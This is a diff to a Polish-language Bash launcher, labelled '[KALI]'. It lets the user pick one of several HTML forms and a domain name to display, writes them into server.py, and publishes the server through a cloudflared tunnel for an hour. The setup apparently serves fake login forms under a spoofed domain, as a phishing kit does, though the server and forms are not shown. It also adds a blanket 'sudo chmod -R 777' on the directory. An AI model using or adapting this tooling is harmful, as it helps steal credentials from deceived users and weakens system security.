@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# 🔥 AUTOMATYCZNE NADANIE UPRAWNIEŃ
+echo "[KALI] Nadaję uprawnienia katalogowi..."
+sudo chmod -R 777 .
+
 echo "=== KONFIGURACJA SERWERA ==="
 echo "1 - form1.html"
 echo "2 - form2.html"
@@ -17,24 +21,28 @@ esac
 
 read -p "Podaj domenę do wyświetlenia: " DOMAIN
 
-# wstrzyknięcie wyboru do server.py
+# 🔥 PODMIANA W server.py
 sed -i "s/selected_form = .*/selected_form = \"$FORM\"/" server.py
 sed -i "s/domain = .*/domain = \"$DOMAIN\"/" server.py
 
 echo "[KALI] Wybrano formularz: $FORM"
 echo "[KALI] Ustawiono domenę: $DOMAIN"
 
+# 🔥 URUCHOMIENIE SERWERA
 python3 server.py &
 SERVER_PID=$!
 
+# 🔥 URUCHOMIENIE TUNELU
 cloudflared tunnel --url http://localhost:8000 > tunnel.log 2>&1 &
 TUNNEL_PID=$!
 
 echo "Tunel uruchomiony. Link w tunnel.log"
 
+# 🔥 CZAS DZIAŁANIA
 sleep 3600
 
+echo "[KALI] Zamykam serwer i tunel..."
 kill $SERVER_PID
 kill $TUNNEL_PID
 
-echo "Serwer i tunel zamknięte."
+echo "[KALI] Zakończono."
